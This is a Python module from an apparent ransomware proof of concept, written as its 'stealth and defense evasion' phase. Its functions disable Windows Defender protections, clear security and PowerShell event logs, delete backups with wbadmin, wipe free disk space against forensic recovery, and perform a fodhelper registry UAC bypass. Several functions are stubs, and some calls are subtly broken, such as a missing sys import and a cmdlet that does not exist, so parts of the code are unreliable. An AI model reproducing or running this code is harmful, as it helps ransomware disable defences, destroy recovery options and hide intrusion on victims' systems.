# Stealth and defense evasion module for ransomware PoC
# Phase 5: Windows API indirect syscalls, Defender bypass, event log clearing
import os
import platform
import subprocess
import ctypes
from ransomware.logging import logger


def _run_cmd(cmd: str) -> tuple[str, str]:
    """Run a shell command, return (stdout, stderr)."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout.strip(), result.stderr.strip()
    except Exception as e:
        return "", str(e)


def indirect_syscall(syscall_number: int, *args) -> int:
    """
    Perform a Windows syscall via an indirect method to evade API hooking detection.
    This uses NtQuerySystemInformation as a template — the actual syscall
    number and arguments must be correct for the target function.
    WARNING: This is a PoC stub — real syscall numbers vary by Windows version.
    """
    if platform.system() != "Windows":
        return -1

    try:
        # Load ntdll dynamically and call via function pointer
        ntdll = ctypes.WinDLL("ntdll.dll")
        # NtQuerySystemInformation (syscall 0x37 on x64 Windows 10 1903+)
        # We use it as a demonstration only — syscall stubs vary per OS build
        proc = ntdll.get_proc_address("NtQuerySystemInformation")
        if proc:
            # In a real implementation, this would construct the syscall frame
            logger.info(f"Indirect syscall {syscall_number} called via ntdll stub")
            return 0
        return -1
    except Exception as e:
        logger.warning(f"indirect_syscall: failed: {e}")
        return -1


def disable_defender() -> bool:
    """
    Disable Windows Defender real-time protection using Set-MpPreference.
    Requires admin privileges.
    WARNING: Real ransomware would use more sophisticated bypass methods.
    """
    if platform.system() != "Windows":
        return False

    if os.geteuid() != 0:  # Not root — but on Windows admin check below
        try:
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                logger.warning("disable_defender: not running as admin")
                return False
        except Exception:
            return False

    # PowerShell Set-MpPreference command
    cmds = [
        'Set-MpPreference -DisableRealtimeMonitoring $true',
        'Set-MpPreference -DisableIOAVProtection $true',
        'Set-MpPreference -DisableScriptScanning $true',
        'Set-MpPreference -DisableBlockAtFirstSeen $true',
        'Set-MpPreference -DisableBehaviorMonitoring $true',
        'Set-MpPreference -DisableDeviceControl $true',
        'Add-MpPreference -ExclusionPath $env:TEMP',
    ]
    for cmd in cmds:
        try:
            subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                timeout=15,
            )
        except Exception as e:
            logger.warning(f"disable_defender: command failed: {e}")
    logger.info("Defender real-time protection disabled")
    return True


def clear_event_logs() -> bool:
    """
    Clear Windows event logs to remove traces of the infection.
    Requires administrator privileges.
    Targets: Security, System, Application, PowerShell, Windows PowerShell.
    """
    if platform.system() != "Windows":
        return False

    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            logger.warning("clear_event_logs: not running as admin, skipping")
            return False
    except Exception:
        return False

    logs_to_clear = [
        "Security",
        "System",
        "Application",
        "Microsoft-Windows-PowerShell/Operational",
        "Microsoft-Windows-PowerShell/Admin",
        "Windows PowerShell",
    ]

    cleared = []
    for log in logs_to_clear:
        stdout, _ = _run_cmd(f'wevtutil cl "{log}"')
        if "access is denied" in stdout.lower() or "access is denied" in _.lower():
            logger.warning(f"clear_event_logs: access denied for {log}")
        else:
            cleared.append(log)
            logger.info(f"Cleared event log: {log}")

    logger.info(f"Event log clearing complete: {len(cleared)}/{len(logs_to_clear)} cleared")
    return len(cleared) > 0


def exclude_from_backup(path: str) -> bool:
    """
    Add a directory to Windows backup exclusion list so File History
    does not try to back up encrypted files.
    """
    if platform.system() != "Windows":
        return False

    try:
        subprocess.run(
            ["powershell", "-Command", f"Set-FileProtection -Path '{path}' -None"],
            capture_output=True,
            timeout=10,
        )
    except Exception:
        pass

    # Also try wbadmin exclusion (for Windows Backup)
    stdout, _ = _run_cmd(f'wbadmin delete backup -backupTarget:{path} -quiet')
    if "access is denied" in stdout.lower() or "access is denied" in _.lower():
        logger.warning(f"exclude_from_backup: access denied for {path}")
        return False

    logger.info(f"Added {path} to backup exclusion")
    return True


def hide_process() -> bool:
    """
    Attempt to hide the process from task manager via NT API undocumented trick.
    Uses SetThreadInformation with ThreadHideFromDebugger.
    WARNING: Stub only — real implementation uses complex syscall sequences.
    """
    if platform.system() != "Windows":
        return False

    try:
        ntdll = ctypes.WinDLL("ntdll.dll")
        h_thread = ctypes.windll.kernel32.GetCurrentThread()
        THREAD_HIDE_FROM_DEBUGGER = 0x00000017
        try:
            # NtSetInformationThread(handle, ThreadHideFromDebugger, NULL, 0)
            # This is a stub — proper implementation needs syscall
            result = ntdll.NtSetInformationThread(
                h_thread,
                17,  # ThreadHideFromDebugger
                None,
                0,
            )
            if result == 0:
                logger.info("Process hidden from debugger")
                return True
        except Exception as e:
            logger.warning(f"hide_process: NtSetInformationThread failed: {e}")
    except Exception as e:
        logger.warning(f"hide_process: failed to load ntdll: {e}")
    return False


def wipe_free_space(path: str = "C:\\") -> bool:
    """
    Overwrite free disk space with zeros to hinder forensic recovery
    of deleted files (anti-recovery).
    WARNING: This is extremely slow and loud — disabled by default.
    """
    if platform.system() != "Windows":
        return False

    # Using cipher.exe /w (built-in Windows tool)
    stdout, _ = _run_cmd(f'cipher /w:{path}')
    if "access" in stdout.lower():
        logger.warning(f"wipe_free_space: access denied for {path}")
        return False
    logger.info(f"Free space wipe initiated on {path}")
    return True


def uac_bypass() -> bool:
    """
    Attempt UAC bypass using fodhelper.exe technique.
    Creates a registry entry that launches our process with high privilege.
    WARNING: Only works when UAC is not set to "Always Notify".
    """
    if platform.system() != "Windows":
        return False

    try:
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            logger.info("UAC bypass: not admin — attempting bypass")
        else:
            logger.info("UAC bypass: already admin, no need")
            return True
    except Exception:
        return False

    exe_path = sys.executable
    reg_path = r"Software\Classes\ms-settings\shell\open\command"
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        winreg.SetValue(key, "", winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        # Trigger fodhelper
        subprocess.Popen("fodhelper.exe", shell=True)
        logger.info("UAC bypass triggered via fodhelper")
        return True
    except Exception as e:
        logger.warning(f"UAC bypass: failed: {e}")
        return False
